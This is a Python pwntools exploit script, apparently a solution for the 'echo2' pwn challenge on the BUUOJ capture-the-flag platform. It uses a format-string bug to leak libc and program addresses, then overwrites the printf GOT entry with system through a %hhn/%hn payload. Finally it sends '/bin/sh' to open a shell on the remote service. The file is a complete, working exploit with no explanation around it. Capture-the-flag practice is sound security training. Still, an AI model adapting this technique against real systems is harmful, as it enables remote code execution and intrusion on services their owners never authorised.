#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/25 18:32:50
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('echo2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 25615
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('echo2')

sh.sendline("%p-%41$p")
sh.recvuntil("0x")
libc_base = int(sh.recv(12),16) - libc.symbols['_IO_2_1_stdin_'] -131
system_addr = libc_base + libc.symbols['system']
sh.recvuntil("0x")
program_base = int(sh.recv(12),16) - 0xa03
log.info("libc_base=>{}".format(hex(libc_base)))
log.info("program_base=>{}".format(hex(program_base)))
printf_got = program_base + 0x201020
system_plt = program_base + 0x7A0
log.info("printf_got=>{}".format(hex(printf_got)))
log.info("system_plt=>{}".format(hex(system_plt)))
# pause()
# printf_got => system_plt
num_1 = system_addr & 0xff
num_2 = (system_addr >> 8) & 0xffff
# log.info("num_1:{}num_2:{}num_3:{}".format(hex(num_1),hex(num_2),hex(num_3)))
# pause()
payload = "%" + str(num_1)+ "c%14$hhn%" + str(num_2-num_1) +"c%15$hn" 
payload = payload.ljust(0x40,'a')
payload += p64(printf_got) + p64(printf_got+1)
sh.sendline(payload)
    # gdb.attach(sh)
    # pause()
sh.sendline("/bin/sh\x00")
sh.interactive()